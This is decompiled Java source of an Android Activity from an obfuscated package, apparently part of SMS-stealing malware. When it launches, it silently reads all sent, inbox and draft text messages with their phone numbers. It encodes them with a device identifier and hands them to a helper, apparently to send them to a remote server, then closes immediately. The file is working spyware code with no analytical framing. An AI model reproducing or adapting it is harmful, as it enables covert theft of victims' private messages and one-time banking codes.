package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import wocwvy.czyxoxmbauu.slsa.C0020b;

/* JADX INFO: loaded from: classes.dex */
public class bdxyqqt extends Activity {

    /* JADX INFO: renamed from: a */
    C0020b f446a = new C0020b();

    /* JADX INFO: renamed from: a */
    private String m286a(String str) {
        String str2;
        try {
            Cursor cursorQuery = getContentResolver().query(Uri.parse("content://" + str), null, null, null, null);
            startManagingCursor(cursorQuery);
            if (cursorQuery.getCount() <= 0) {
                return "";
            }
            String str3 = "";
            if (str.equals("sms/sent")) {
                str3 = "-----SENT-----";
            } else if (str.equals("sms/inbox")) {
                str3 = "-----INBOX-----";
            } else if (str.equals("sms/draft")) {
                str3 = "-----DRAFT-----";
            }
            while (cursorQuery.moveToNext()) {
                String string = cursorQuery.getString(12);
                if (string == null) {
                    str2 = "";
                } else {
                    str2 = string + " ";
                }
                str3 = str3 + "\nNumber: (" + cursorQuery.getString(2) + ")\nText: " + str2 + cursorQuery.getString(13);
            }
            return str3;
        } catch (Exception unused) {
            return "";
        }
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        String strM286a = m286a("sms/sent");
        String strM286a2 = m286a("sms/inbox");
        String strM286a3 = m286a("sms/draft");
        if (!strM286a.equals("")) {
            C0020b c0020b = this.f446a;
            StringBuilder sb = new StringBuilder();
            sb.append("p=");
            sb.append(this.f446a.m242c(this.f446a.m264q(this) + "|" + strM286a + "|"));
            c0020b.m235b(this, "4", sb.toString());
        }
        if (!strM286a2.equals("")) {
            C0020b c0020b2 = this.f446a;
            StringBuilder sb2 = new StringBuilder();
            sb2.append("p=");
            sb2.append(this.f446a.m242c(this.f446a.m264q(this) + "|" + strM286a2 + "|"));
            c0020b2.m235b(this, "4", sb2.toString());
        }
        if (!strM286a3.equals("")) {
            C0020b c0020b3 = this.f446a;
            StringBuilder sb3 = new StringBuilder();
            sb3.append("p=");
            sb3.append(this.f446a.m242c(this.f446a.m264q(this) + "|" + strM286a3 + "|"));
            c0020b3.m235b(this, "4", sb3.toString());
        }
        finish();
    }
}
